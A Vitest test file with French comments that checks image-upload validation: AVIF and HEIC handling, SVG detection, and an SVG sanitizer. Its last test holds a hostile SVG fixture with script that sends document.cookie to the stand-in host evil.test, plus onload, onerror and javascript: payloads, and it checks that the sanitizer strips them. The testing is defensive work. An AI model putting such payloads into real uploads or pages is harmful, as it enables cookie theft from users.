import { describe, it, expect } from "vitest";
import sharp from "sharp";
import {
  ACCEPTED_SHARP_FORMATS,
  SVG_MIME_TYPE,
  looksLikeSvgBuffer,
  sanitizeSvg,
  validateSourceFile,
} from "@/lib/upload-specs";

describe("upload AVIF", () => {
  // Piège : sharp ne rapporte pas « avif » mais « heif ». Sans ce nom dans la
  // liste, le serveur refuserait un AVIF que le navigateur a laissé passer.
  it("le format rapporté par sharp pour un AVIF est accepté par le serveur", async () => {
    const avif = await sharp({
      create: { width: 8, height: 8, channels: 3, background: "#c00" },
    })
      .avif()
      .toBuffer();
    expect(ACCEPTED_SHARP_FORMATS).toContain((await sharp(avif).metadata()).format);
  });

  it("accepte un .avif, y compris quand le navigateur ne rapporte aucun type MIME", () => {
    expect(validateSourceFile({ type: "image/avif", size: 1000, name: "visuel.avif" })).toBeNull();
    expect(validateSourceFile({ type: "", size: 1000, name: "VISUEL.AVIF" })).toBeNull();
  });

  it("refuse toujours le HEIC, que sharp ne sait pas décoder", () => {
    expect(validateSourceFile({ type: "image/heic", size: 1000, name: "photo.heic" })).not.toBeNull();
  });
});

describe("upload SVG", () => {
  // Le SVG n'est ouvert qu'au logo marque : partout ailleurs les dimensions
  // sont imposées et l'image passe par sharp, qui le rasteriserait.
  it("n'est accepté que par les types qui le déclarent", () => {
    expect(validateSourceFile({ type: SVG_MIME_TYPE, size: 1000, name: "logo.svg" })).not.toBeNull();
    expect(validateSourceFile({ type: SVG_MIME_TYPE, size: 1000, name: "logo.svg" }, true)).toBeNull();
    // Windows ne rapporte pas toujours le type MIME : l'extension fait foi.
    expect(validateSourceFile({ type: "", size: 1000, name: "LOGO.SVG" }, true)).toBeNull();
  });

  it("reste soumis au plafond de poids", () => {
    expect(
      validateSourceFile({ type: SVG_MIME_TYPE, size: 999 * 1024 * 1024, name: "logo.svg" }, true),
    ).not.toBeNull();
  });

  it("reconnaît un SVG au contenu, y compris précédé d'une déclaration XML", () => {
    expect(looksLikeSvgBuffer(Buffer.from('<?xml version="1.0"?>\n<svg xmlns="x"></svg>'))).toBe(true);
    expect(looksLikeSvgBuffer(Buffer.from("\x89PNG\r\n\x1a\n"))).toBe(false);
  });

  // Un logo n'a aucune raison d'exécuter du code, et le fichier est servi tel
  // quel : tout ce qui peut s'exécuter doit disparaître avant stockage.
  it("retire scripts et gestionnaires d'événements", () => {
    const hostile = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
      <script>fetch('//evil.test?c='+document.cookie)</script>
      <script src="//evil.test/x.js"/>
      <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror='alert(2)'></body></foreignObject>
      <a xlink:href="javascript:alert(3)"><circle cx="5" cy="5" r="4" fill="#c00"/></a>
    </svg>`;
    const clean = sanitizeSvg(hostile);
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/onload\s*=/i);
    expect(clean).not.toMatch(/onerror\s*=/i);
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/foreignObject/i);
    // Le dessin lui-même est intact.
    expect(clean).toContain('<circle cx="5" cy="5" r="4" fill="#c00"/>');
    expect(clean).toContain("<svg");
  });
});
